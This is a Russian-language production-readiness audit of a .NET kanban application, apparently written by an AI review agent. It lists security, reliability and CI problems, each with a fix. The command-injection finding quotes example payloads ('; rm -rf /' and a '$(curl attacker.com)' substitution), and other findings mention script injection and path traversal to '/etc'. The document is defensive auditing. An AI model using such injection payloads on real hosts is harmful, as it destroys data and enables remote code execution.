# Ревью готовности к продакшену — Beaver Board Kanban

**Проект:** Beaver Board Kanban (KittyClaw)  
**Версия:** v0.1.0-preview  
**Дата ревью:** 2026-01-25  
**Ревьюер:** Code Review Agent (systematic audit)

---

## Общая оценка

**Статус: НЕ ГОТОВ К ПРОДАКШЕНУ**

Проект функционально богат и архитектурно продуман, но содержит **критические блокеры** в области безопасности, надёжности и инфраструктуры. Текущая версия `v0.1.0-preview` адекватно отражает реальное состояние — это качественный превью, требующий серьёзной доработки перед stable release.

**Рекомендация:** Не разворачивать в открытом доступе и не выпускать как v1.0.0 до устранения критических проблем. Для локального использования на доверенной машине — приемлемо с оговорками.

---

## Критические проблемы (Must Fix — блокируют прод)

### 1. Полный отсутствие аутентификации на API
- **Файл:** `KittyClaw.Web/Program.cs`
- **Проблема:** `AddAuthentication()` / `AddAuthorization()` никогда не вызываются. IDE endpoints (`/api/v1/ide/*`) декларируют `.RequireAuthorization("ApiToken")`, но политика не зарегистрирована — ASP.NET Core игнорирует её. Все остальные endpoint'ы (`/api/projects`, `/api/tickets`, `/api/runs`, `/api/chat`, `/api/images`, `/api/automations`) — вообще без авторизации.
- **Последствия:** Если порт будет доступен из сети (даже случайно), любой может управлять доской, запускать агентов, читать чат, загружать/скачивать файлы.
- **Исправление:** Зарегистрировать `AddAuthentication()` / `AddAuthorization()`. Реализовать custom scheme для `ApiToken`, читающий `Authorization` заголовок. Добавить default authorization requirement на группу `/api`.

### 2. Command Injection в OpenCodeRunner и ClaudeRunner
- **Файлы:** `KittyClaw.Core/Integrations/OpenCode/OpenCodeRunner.cs:553-556`, `808-831`; `KittyClaw.Core/Automation/ClaudeRunner.cs` (аргументы CLI)
- **Проблема:** `Arguments = string.Join(" ", arguments)` и наивный `Replace("{prompt}", request.Prompt)` в шаблонах команд. Ввод пользователя (prompt, пути, токены) попадает в shell-строку без экранирования.
- **Последствия:** Агент или пользователь с доступом к API может выполнить произвольные команды на хосте (`; rm -rf /`, `$(curl attacker.com)`).
- **Исправление:** Перейти на `ProcessStartInfo.ArgumentList` (массив аргументов, а не строка). Валидировать и санитизировать все placeholder'ы в шаблонах.

### 3. Stored XSS через Markdown-рендеринг
- **Файлы:** `KittyClaw.Web/Markdown/ChatMarkdownRenderer.cs:18`, `CommentMarkdownPipeline.cs:10-13`
- **Проблема:** Markdig с `UseAdvancedExtensions()` рендерит raw HTML. В чат, комментарии и описания тикетов можно вставить `<script>` — он выполнится в браузере других пользователей.
- **Последствия:** Кража сессий, CSRF, deface. В контексте локального приложения — кража API-токена или выполнение произвольных действий от имени пользователя.
- **Исправление:** Пропускать вывод Markdig через HTML sanitizer (HtmlSanitizer, AngleSharp) перед отдачей клиенту. Добавить `DisallowRawHtml` extension в Markdig.

### 4. Path Traversal → произвольное чтение/запись/выполнение
- **Файл:** `KittyClaw.Core/Services/ProjectService.cs:112`
- **Проблема:** `workspacePath` принимается от пользователя без валидации. Все последующие операции (dashboard tiles, sidecar файлы, image uploads, `DashboardScriptRunner`) работают с этим путём.
- **Последствия:** Атакующий может задать `workspacePath = /etc` или `../sensitive-dir`, и Beaver Board будет читать/писать/исполнять скрипты там.
- **Исправление:** Валидировать `Path.GetFullPath()`, проверять отсутствие `..`, убедиться что путь внутри allowed root (или явно подтверждён пользователем). `DashboardScriptRunner` должен запускать скрипты только внутри workspace.

### 5. SQLite concurrent access — data loss и deadlocks
- **Файлы:** `KittyClaw.Core/Services/ProjectService.cs:147`, `TicketService.cs` (везде)
- **Проблема:** `TicketService` (singleton) создаёт новый `TodoDbContext` на каждый вызов, но все они указывают на один SQLite-файл. SQLite имеет один write lock. Под нагрузкой автоматизации и Blazor circuits происходит `database is locked`, WAL может коррумпироваться.
- **Последствия:** Потеря данных тикетов, молчаливая ошибка записи, несогласованность состояния доски.
- **Исправление:** Добавить `PRAGMA busy_timeout = 5000` к SQLite. Ввести `SemaphoreSlim` на запись в БД. Или мигрировать на PostgreSQL для продакшена.

### 6. NU1903 — подавление предупреждений об уязвимостях NuGet
- **Файлы:** `KittyClaw.Web/KittyClaw.Web.csproj:18`, `KittyClaw.Core/KittyClaw.Core.csproj:8`, `KittyClaw.Core.Tests/KittyClaw.Core.Tests.csproj:8`
- **Проблема:** `NoWarn>$(NoWarn);NU1903</NoWarn>` скрывает известные уязвимости в зависимостях.
- **Последствия:** Устаревшие пакеты с CVE не будут видны при сборке.
- **Исправление:** Убрать suppression. Обновить уязвимые пакеты.

### 7. Целевой фреймворк .NET 10 Preview
- **Файлы:** все `.csproj`, `global.json`
- **Проблема:** `net10.0` — preview/близкий к stable, но без гарантии LTS. Пакеты с wildcard (`10.0.*`) могут ломать сборку недетерминированно. `Microsoft.NET.Test.Sdk 17.14.1` — очень свежий.
- **Последствия:** Нестабильность, отсутствие долгосрочной поддержки, риск breaking changes в патчах.
- **Исправление:** Зафиксировать все версии пакетов (убрать `*`). Добавить `allowPrerelease: false` в `global.json`. Рассмотреть `net8.0` (LTS) или `net9.0` (STS) как fallback до стабилизации .NET 10.

### 8. HttpClient — утечка сокетов
- **Файлы:** `KittyClaw.Core/Integrations/OpenCode/OpenCodeRunner.cs:233`, `KittyClaw.Web/Program.cs:279`
- **Проблема:** `new HttpClient()` создаётся напрямую вместо `IHttpClientFactory`. Каждый инстанс держит TCP-соединение до GC.
- **Последствия:** Исчерпание ephemeral ports, `SocketException`, невозможность исходящих HTTP-запросов.
- **Исправление:** Инжектировать `IHttpClientFactory`, использовать `CreateClient()` (named clients для OpenCode и docs).

### 9. DashboardScriptRunner — выполнение произвольного кода без sandbox
- **Файл:** `KittyClaw.Core/Services/DashboardScriptRunner.cs`
- **Проблема:** Выполняет `.ps1/.sh/.js/.py` файлы из workspace с полными правами пользователя. Нет sandbox, нет allowlist, нет ограничения по времени/ресурсам.
- **Последствия:** Любой скрипт в `.dashboard/` может стирать данные, устанавливать malware, майнить.
- **Исправление:** Ввести sandbox (chroot, container, restricted user), ограничение CPU/time, подпись скриптов или explicit allowlist.

### 10. Process lifecycle leak (zombie processes)
- **Файлы:** `KittyClaw.Core/Automation/ClaudeRunner.cs:425`, `ProcessLifecycleManager.cs`
- **Проблема:** `ProcessJobObject` — Windows-only. На Linux/macOS дочерние процессы (Claude CLI, тестовые серверы) могут пережить родителя. Нет `setsid` + `kill(-pid)`.
- **Последствия:** Накопление zombie процессов, исчерпание ресурсов, зависание на shutdown.
- **Исправление:** Реализовать platform-specific cleanup (Linux: `setsid` + `kill(-pgid)`, macOS: `killpg`). Добавить watchdog на orphaned процессы.

### 11. Fire-and-forget задачи без CancellationToken
- **Файл:** `KittyClaw.Core/Automation/ClaudeRunner.cs:289`
- **Проблема:** `_ = Task.Run(() => RunAsync(..., CancellationToken.None));` — follow-up run без cancellation и без отслеживания.
- **Последствия:** При shutdown задача продолжает писать в SQLite, спавнить процессы.
- **Исправление:** Track через `CancellationTokenSource` scoped на lifetime приложения.

---

## Важные проблемы (Should Fix — архитектура, надёжность)

### 12. Пустые catch-блоки — молчаливая потеря ошибок
- **Файлы:** `Program.cs:167`, `ClaudeRunner.cs:368`, `TicketService.cs` (множество `ALTER TABLE` миграций), `OpenCodeRunner.cs:710`, `ClaudeStreamPump.cs:144`, `UpdateCheckService.cs:44`
- **Проблема:** `catch { /* ignore */ }` или `catch (OperationCanceledException) { }` без логирования. Миграции БД, чтение настроек, парсинг JSON — всё глотается.
- **Исправление:** Логировать минимум `LogWarning`. Различать ожидаемые (column already exists → `LogDebug`) и неожиданные (I/O error → `LogError`).

### 13. API Token — SHA256 без salt, brute-force
- **Файл:** `KittyClaw.Web/Services/ApiTokenService.cs`
- **Проблема:** Хэш токена хранится как plain SHA256 в `settings.json`. Нет rate limiting на попытки верификации.
- **Исправление:** Перейти на PBKDF2/Argon2 с salt. Или использовать OS keychain (macOS Keychain, Windows DPAPI, Linux libsecret). Добавить in-memory rate limiter на failed attempts.

### 14. CORS слишком пермиссивный + AllowedHosts: *
- **Файлы:** `Program.cs:211-224`, `appsettings.json:8`
- **Проблема:** `AllowAnyMethod()`, `AllowAnyHeader()` + `AllowedHosts: *`. При отсутствии аутентификации это позволяет другим localhost-сервисам делать cross-origin запросы.
- **Исправление:** Убрать `AllowAnyMethod`/`AllowAnyHeader`, заменить на явный allowlist. Ограничить `AllowedHosts` (не `*`).

### 15. Health endpoint — синхронный File I/O на каждый запрос
- **Файл:** `Program.cs:287-357`
- **Проблема:** `File.WriteAllText` / `File.Delete` в `/api/health` и `/health`. Health checks вызываются часто (load balancer, orchestrator).
- **Исправление:** Использовать async I/O (`File.WriteAllTextAsync`). Или проверять writable без создания файла.

### 16. Unbounded memory growth в словарях
- **Файлы:** `RunConcurrencyGate.cs:19`, `TicketAutoRunService.cs:51`, `AgentRun.cs:46-47`
- **Проблема:** `Dictionary<string, DateTime> _lastStarted` никогда не чистится. `_recentDuplicates` чистится только при активности. `_buffer` в `AgentRun` может переполняться через `PushWithoutEvent`.
- **Исправление:** LRU cache, `MemoryCache` с expiration, periodic cleanup.

### 17. Singleton + BackgroundService + DbContext = race condition
- **Файлы:** `Program.cs:39-48`, `TicketService.cs`, `AutomationEngine.cs`, `DashboardRefreshService.cs`, `TicketAutoRunService.cs`
- **Проблема:** Несколько singleton'ов и background services обращаются к одному SQLite-файлу без координации. Нет row-level locking.
- **Исправление:** Семафор на запись в БД. Или отказ от SQLite для многопоточных writes.

### 18. BackgroundService StopAsync — бесконечное ожидание
- **Файл:** `KittyClaw.Core/Automation/TicketAutoRunService.cs:88-95`
- **Проблема:** `Task.WhenAny(_loopTask, Task.Delay(Timeout.Infinite, ct))` — бесконечно, если токен не отменён. Нет bounded timeout.
- **Исправление:** Добавить `Task.Delay(5000)` как hard timeout. Force-cancel если loop не завершился.

### 19. Missing multi-platform CI
- **Файл:** `.github/workflows/ci.yml`
- **Проблема:** CI только на `ubuntu-latest`. macOS (primary target) и Windows не тестируются.
- **Исправление:** Matrix: `ubuntu-latest`, `macos-latest`, `windows-latest`.

### 20. Release workflow — только Linux, нет macOS/Windows
- **Файл:** `.github/workflows/release.yml`
- **Проблема:** Создаёт только `BeaverBoard-linux.tar.gz`. macOS `.app` + DMG (primary target) — не автоматизированы. Windows — вообще нет.
- **Исправление:** Добавить macOS runner с `build-macos.sh` + `package-dmg.sh` + codesign. Добавить Windows job.

### 21. Нет code signing / notarization для macOS
- **Файлы:** `scripts/release/build-macos.sh`, `docs/release-readiness.md`
- **Проблема:** Unsigned `.app`. Gatekeeper требует manual approve. Пользователи не доверяют.
- **Исправление:** Developer ID certificate в GitHub Secrets. `codesign` + `xcrun notarytool` в CI.

### 22. Gitleaks License — single point of failure в CI
- **Файл:** `.github/workflows/ci.yml`
- **Проблема:** `secrets-scan` job требует `secrets.GITLEAKS_LICENSE`. Если лицензия протухла — CI ломается.
- **Исправление:** `continue-on-error: true` на Gitleaks step. Fallback на `trufflehog` (open source, no license).

### 23. Нет smoke tests в release pipeline
- **Файл:** `.github/workflows/release.yml`
- **Проблема:** Сразу после `dotnet test` → `publish` → `release`. Нет проверки что собранный бинарник вообще стартует.
- **Исправление:** Добавить job: скачать artifact, запустить бинарник, дождаться `/health`, выполнить минимальный API-запрос.

### 24. Нет Docker / container image
- **Проблема:** Нет Dockerfile. Усложняет тестирование и деплой.
- **Исправление:** Multi-stage Dockerfile. CI step для build и push в GHCR.

### 25. `appsettings.Production.json` отсутствует
- **Файл:** `KittyClaw.Web/appsettings.json`
- **Проблема:** Нет production-конфигурации. Все defaults — dev-only (localhost, debug уровень логов).
- **Исправление:** Создать `appsettings.Production.json` с production-значениями.

---

## Минорные проблемы (Nice to Have)

### 26. TODO-комментарии в production-коде
- **Файлы:** `Endpoints.Roster.cs:115,127,152`, `ActionExecutor.Runners.cs:75`, `WorktreeService.cs:104,116`, `OpenCodeProviderModelCatalog.cs:226`
- **Рекомендация:** Конвертировать в GitHub issues. Убрать из кода или пометить `[v1.0]`.

### 27. Закомментированные stubs в Program.cs
- **Файл:** `Program.cs:88-94`
- **Проблема:** 6 закомментированных `builder.Services.AddSingleton<IAgentRuntime, ...>()` для будущих runtime'ов.
- **Рекомендация:** Убрать. Документировать план в architecture doc.

### 28. `ProjectService.DeleteProjectAsync` — ClearAllPools вместо targeted
- **Файл:** `ProjectService.cs:138`
- **Проблема:** `SqliteConnection.ClearAllPools()` очищает пулы для **всех** БД, не только удаляемого проекта.
- **Рекомендация:** Использовать `ClearPool(connection)` для конкретного соединения.

### 29. `Program.cs` — 378 строк, смешение concerns
- **Рекомендация:** Вынести health checks, CORS, dev endpoints, auth в extension methods (`IEndpointRouteBuilder` / `IServiceCollection`).

### 30. `PortDescriptor` / PID файлы — не чистятся при shutdown
- **Файл:** `BeaverBoardPaths.cs:262-266`
- **Проблема:** Файлы пишутся при старте, но не удаляются при graceful shutdown. Stale PID может вводить launcher в заблуждение.
- **Рекомендация:** Подписаться на `IHostApplicationLifetime.ApplicationStopping` и удалять файлы.

### 31. `CHANGELOG.md` — placeholder дата
- **Файл:** `CHANGELOG.md:29`
- **Проблема:** `[0.9.0]` содержит `2025-06-XX`.
- **Рекомендация:** Исправить дату.

### 32. Нет Dependabot / Renovate
- **Рекомендация:** Добавить `.github/dependabot.yml` для NuGet и GitHub Actions.

### 33. `KittyClaw` namespace вместо `BeaverBoard`
- **Рекомендация:** Для v1.0.0 завершить миграцию namespace'ов.

### 34. Source-text tests вместо runtime tests
- **Файлы:** `AskUserQuestionSchemaTests.cs`, `AskUserQuestionBugfixTests.cs`
- **Проблема:** Тесты проверяют наличие строки в исходном коде, а не runtime behavior.
- **Рекомендация:** Заменить на unit/integration tests с инстанцированием классов.

---

## Что сделано хорошо (Strengths)

- **Архитектура:** Чистое разделение на Core / Web / Tests / QaRunner. Модульная система runtime'ов (Claude, OpenCode, и т.д.).
- **Тестовая инфраструктура:** 46+ тестовых файлов, использование `WebApplicationFactory`, xUnit, Coverlet.
- **Автоматизация:** CI с build + test + Gitleaks, PR template, issue templates, `SECURITY.md`, `CONTRIBUTING.md`.
- **Packaging:** macOS `.app` bundle, DMG, launcher с lock/port/pid, self-contained publish.
- **OpenAPI:** Автоматическая генерация документации из живого спека.
- **Платформенность:** macOS `~/Library/...`, Linux XDG, Windows `%APPDATA%`, `BEAVERBOARD_DATA_DIR` override.
- **Release Readiness Matrix:** Честная и актуальная документация о состоянии проекта.
- **Public baseline audit:** Скрипт `audit-public-repo.sh` сканирует приватные пути.
- **Localization:** i18n с JSON-файлами для EN/FR.

---

## Рекомендуемый порядок исправлений (приоритет)

| Приоритет | Действие | Зачем |
|-----------|----------|-------|
| P0 | **Исправить аутентификацию** (регистрация auth services, API token policy) | Без этого приложение небезопасно даже локально |
| P0 | **Command injection fix** (`ArgumentList`, escape placeholders) | RCE на хосте |
| P0 | **XSS fix** (HTML sanitizer) | Защита пользователей |
| P0 | **Path traversal fix** (validate workspacePath) | Защита файловой системы |
| P0 | **SQLite concurrency** (busy timeout, semaphore, или PostgreSQL) | Data integrity |
| P1 | **Убрать NU1903 suppression** и обновить пакеты | Security |
| P1 | **Зафиксировать версии NuGet** и стабилизировать .NET target | Build reproducibility |
| P1 | **HttpClient → IHttpClientFactory** | Socket exhaustion fix |
| P1 | **Sandbox для DashboardScriptRunner** | Code execution isolation |
| P1 | **Process cleanup на Linux/macOS** | Zombie process prevention |
| P2 | **Multi-platform CI** (macOS, Windows) | Platform quality |
| P2 | **macOS release в CI** (DMG, codesign, notarization) | Distribution ready |
| P2 | **Smoke tests в release** | Catch broken releases |
| P2 | **Добавить тесты на критические сервисы** (TicketService, ProjectService, AutomationEngine) | Regression prevention |
| P3 | **Refactor Program.cs** | Maintainability |
| P3 | **Cleanup TODO/закомментированные stubs** | Code hygiene |
| P3 | **Dependabot** | Dependency freshness |

---

## Заключение

Beaver Board Kanban — амбициозный и функционально зрелый проект для v0.1.0-preview. Однако **10+ критических проблем** безопасности, надёжности и инфраструктуры делают его **непригодным для production** в текущем виде. Большинство проблем — исправимые архитектурные паттерны (DI, auth, input validation, concurrency). При усердной работе команда из 2-3 разработчиков может устранить критические блокеры за 2-3 недели.

**Рекомендуемый статус:** `v0.1.0-preview` — корректен. До `v1.0.0` требуется выполнить все P0/P1 пункты из матрицы выше.
